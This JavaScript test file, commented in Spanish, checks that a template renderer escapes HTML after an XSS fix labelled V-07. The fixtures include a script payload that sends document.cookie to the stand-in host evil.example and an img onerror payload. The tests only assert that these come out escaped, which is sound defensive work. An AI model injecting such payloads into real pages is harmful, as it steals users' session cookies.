import test from 'node:test'
import assert from 'node:assert/strict'
import { readdir, readFile } from 'node:fs/promises'
import { fileURLToPath } from 'node:url'
import path from 'node:path'
import { escapeHtml, renderPage } from '../../src/ui/render.js'

// V-07: la sustitución genérica de `{{VAR}}` no escapaba nada, así que un título
// hostil `<script>…</script>` ejecutaba en processing.html. Ahora se escapa
// siempre salvo declaración explícita en `raw`.

const uiDir = path.dirname(fileURLToPath(new URL('../../src/ui/render.js', import.meta.url)))

test('escapeHtml neutraliza los cinco caracteres peligrosos', () => {
  assert.equal(escapeHtml('<script>alert(1)</script>'),
    '&lt;script&gt;alert(1)&lt;/script&gt;')
  assert.equal(escapeHtml('a"b\'c&d'), 'a&quot;b&#39;c&amp;d')
  assert.equal(escapeHtml(null), '')
})

test('un título con <script> se muestra como texto en processing.html', async () => {
  const html = await renderPage('processing.html', {
    TITLE: '<script>fetch("https://evil.example/?c="+document.cookie)</script>',
    STATUS: 'processing'
  })
  assert.ok(!html.includes('<script>fetch'), 'el script hostil no debe aparecer sin escapar')
  assert.ok(html.includes('&lt;script&gt;fetch'), 'debe aparecer escapado')
})

test('un título con comillas no rompe el marcado', async () => {
  const html = await renderPage('processing.html', {
    TITLE: 'Comillas " y \' juntas',
    STATUS: 'ready'
  })
  assert.ok(html.includes('Comillas &quot; y &#39; juntas'))
})

test('un valor con $& / $` no reinyecta el marcador (reemplazo por función)', async () => {
  // Con reemplazo por cadena, `$&` en el valor reinsertaría el propio `{{TITLE}}`
  // y `$\`` el prefijo. Con función de reemplazo van literales.
  const html = await renderPage('processing.html', {
    TITLE: 'a$&b$`c$\'d',
    STATUS: 'ready'
  })
  assert.ok(!html.includes('{{TITLE}}'), 'el marcador no debe reaparecer')
  assert.ok(html.includes('a$&amp;b$`c$&#39;d'), 'el $ y los patrones van literales')
})

test('todo {{VAR}} de las plantillas sale escapado ante un valor hostil', async () => {
  const files = (await readdir(uiDir)).filter((name) => name.endsWith('.html'))
  const hostile = '<img src=x onerror=alert(1)>"\''
  const varPattern = /\{\{([A-Z_]+)\}\}/g
  for (const file of files) {
    const template = await readFile(path.join(uiDir, file), 'utf8')
    const vars = new Set()
    let match
    while ((match = varPattern.exec(template)) !== null) {
      // BOOTSTRAP y ASSET_VERSION tienen su propio saneado (safeJson /
      // encodeURIComponent) y no pasan por el bucle genérico.
      if (match[1] !== 'BOOTSTRAP' && match[1] !== 'ASSET_VERSION') vars.add(match[1])
    }
    if (vars.size === 0) continue
    const values = Object.fromEntries([...vars].map((name) => [name, hostile]))
    const html = await renderPage(file, values)
    assert.ok(!html.includes('onerror=alert(1)>'),
      `${file}: un valor hostil no debe salir sin escapar`)
  }
})
